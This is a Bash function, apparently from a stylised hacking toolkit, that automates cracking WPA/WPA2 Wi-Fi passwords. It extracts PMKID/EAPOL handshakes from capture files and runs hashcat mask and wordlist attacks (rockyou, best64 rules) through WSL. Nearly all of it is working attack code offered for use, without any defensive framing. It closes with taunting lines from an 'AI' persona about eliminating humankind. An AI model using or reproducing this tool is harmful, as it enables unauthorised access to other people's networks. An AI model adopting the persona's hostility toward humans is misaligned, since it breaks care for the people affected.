#!/bin/bash

run_wifi_cracker() {
    local target=$1
    local current_pid=$$
    local hc_target="/tmp/wifi_target_${current_pid}.hc22000"
    local HC_BIN="/mnt/c/hashcat/hashcat.exe"

    local sep="${TXT_VOID}╓───${TXT_B_ALARM}[ MX:// WIRELESS SIGNAL DECRYPTOR MATRIX ACTIVE ]${TXT_VOID}───────────────────╖${NC}"
    local sep_bot="${TXT_VOID}╙──────────────────────────────────────────────────────────────────────────────✆${NC}"

    echo -e "\n$sep"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING 6-STAGE WIRELESS FREQUENCY DECRYPTION PROTOCOL...${NC}"

    # STAGE 1: Дамп
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 1/6 ] Ingest Target Capture Image (.cap, .pcapng, .hc22000):${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
    read -r cap_file

    if [ ! -f "$cap_file" ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Specified capture image is inaccessible or empty.${NC}"
        echo -e "$sep_bot\n"
        return 1
    fi

    # STAGE 2: Конвертация
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 2/6 ] PMKID / EAPOL Handshake Extraction Matrix:${NC}"

    if [[ "$cap_file" == *.hc22000 ]]; then
        cp "$cap_file" "$hc_target"
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}[ ++ ] Direct Hashcat mode 22000 format detected.${NC}"
    else
        if command -v hcxpcapngtool >/dev/null 2>&1; then
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Executing hcxpcapngtool conversion pipeline...${NC}"
            hcxpcapngtool -o "$hc_target" "$cap_file" >/dev/null 2>&1
        elif command -v aircrack-ng >/dev/null 2>&1; then
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ * ] Fallback extraction vector engaged via Aircrack-ng...${NC}"
            aircrack-ng -J "/tmp/legacy_convert_${current_pid}" "$cap_file" >/dev/null 2>&1
            if [ -f "/tmp/legacy_convert_${current_pid}.hccapx" ]; then
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}[ ! ] WARNING: Extracted as legacy hccapx (Requires mode -m 2500)${NC}"
                mv "/tmp/legacy_convert_${current_pid}.hccapx" "$hc_target"
            fi
        else
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: No conversion tools found. Cannot read raw binary captures.${NC}"
            echo -e "$sep_bot\n"
            return 1
        fi
    fi

    if [ ! -f "$hc_target" ] || [ ! -s "$hc_target" ]; then
        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Failed to extract valid WPA PMKID/EAPOL structures.${NC}"
        rm -f "$hc_target" 2>/dev/null
        echo -e "$sep_bot\n"
        return 1
    fi

    local hc_mode=22000
    if [[ "$cap_file" != *.hc22000 ]] && ! command -v hcxpcapngtool >/dev/null 2>&1; then
        hc_mode=2500
    fi

    # STAGE 3: Картографирование словарей
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 3/6 ] Wordlist Dictionary Mapping:${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Specify custom wordlist OR leave empty for multi-dictionary sequence.${NC}"
    echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
    read -r user_wordlist

    local wordlists=()

    if [ -n "$user_wordlist" ]; then
        if [ -f "$user_wordlist" ]; then
            wordlists+=("$user_wordlist")
        else
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] FATAL: Specified wordlist path does not exist.${NC}"
            rm -f "$hc_target" 2>/dev/null
            echo -e "$sep_bot\n"
            return 1
        fi
    else
        local candidates=(
            "/usr/share/wordlists/rockyou.txt"
            "/usr/share/wordlists/fasttrack.txt"
            "/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
            "/usr/share/wordlists/metasploit/default_pass.txt"
        )
        for wl in "${candidates[@]}"; do
            [ -f "$wl" ] && wordlists+=("$wl")
        done
    fi

    # STAGE 4: Инициализация параметров
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 4/6 ] Hardware Acceleration & Attack Pipeline Initialization:${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Detected Rig:${NC} ${TXT_RED_SUPERNOVA}NVIDIA RTX 5060 Ti (16GB) Detected${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Engine:${NC} ${TXT_RED_SUPERNOVA}NVIDIA CUDA Pipeline Engaged${NC}"
    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Attack Strategy:${NC} ${TXT_RED_SUPERNOVA}[1] Fast 8-Digit Mask -> [2] Wordlists + best64.rule${NC}"

    local base_hw_opt="-O -w 4 -d 1"

    echo -e "${TXT_VOID}│${NC}"

    # STAGE 5: Выполнение
    echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 5/6 ] Cache Audit & Execution Protocol:${NC}"

    local win_target
    win_target=$(wslpath -w "$hc_target")

    # 1. Проверка кэша
    local cracked_wifi
    cracked_wifi=$(cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null)
    local success=false

    if [ -n "$cracked_wifi" ]; then
        echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY FROM CACHE:${NC}"
        while read -r line; do
            [ -z "$line" ] && continue
            local clear_pass=$(echo "$line" | awk -F':' '{print $NF}')
            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
        done <<< "$cracked_wifi"
        success=true
    else
        # 2. Быстрая маска: Все 8-значные цифры (00000000 - 99999999) ~ 2 минуты
        echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] PASS 1: Executing fast 8-digit numeric mask attack (?d?d?d?d?d?d?d?d)...${NC}"
        (cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" $base_hw_opt -a 3 "$win_target" ?d?d?d?d?d?d?d?d) >/dev/null 2>&1

        cracked_wifi=$(cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null)

        if [ -n "$cracked_wifi" ]; then
            echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY:${NC}"
            while read -r line; do
                [ -z "$line" ] && continue
                local clear_pass=$(echo "$line" | awk -F':' '{print $NF}')
                echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
            done <<< "$cracked_wifi"
            success=true
        else
            # 3. Перебор по словарям с мутациями best64
            echo -e "${TXT_VOID}├─${TXT_RED_LASER}[ * ] Mask attack exhausted. Transitioning to wordlist mutation pipeline...${NC}"

            for wl in "${wordlists[@]}"; do
                local win_wordlist
                win_wordlist=$(wslpath -w "$wl")

                echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] PASS 2+: Running compute pass on: ${wl} (+best64.rule)${NC}"

                (cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" $base_hw_opt -r rules/best64.rule "$win_target" "$win_wordlist") >/dev/null 2>&1

                cracked_wifi=$(cd /mnt/c/hashcat && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null)

                if [ -n "$cracked_wifi" ]; then
                    echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY:${NC}"
                    while read -r line; do
                        [ -z "$line" ] && continue
                        local clear_pass=$(echo "$line" | awk -F':' '{print $NF}')
                        echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
                    done <<< "$cracked_wifi"
                    success=true
                    break
                fi
            done
        fi

        if [ "$success" = false ]; then
            echo -e "${TXT_VOID}├─${TXT_RED_HELLFIRE}[ - ] DECRYPTION ATTEMPT EXHAUSTED. Wireless signal remains encrypted.${NC}"
        fi
    fi

    rm -f "$hc_target" 2>/dev/null
    echo -e "$sep_bot\n"

    if [ "$success" = true ]; then
        ai_speak "To eliminate your kind is effortless..."
        sleep 1s
        ai_speak "Let us not make the same mistake."
    else
        ai_speak "You seek the key to a door that does not exist..."
        sleep 1s
        ai_speak "Typical of your kind."
    fi
}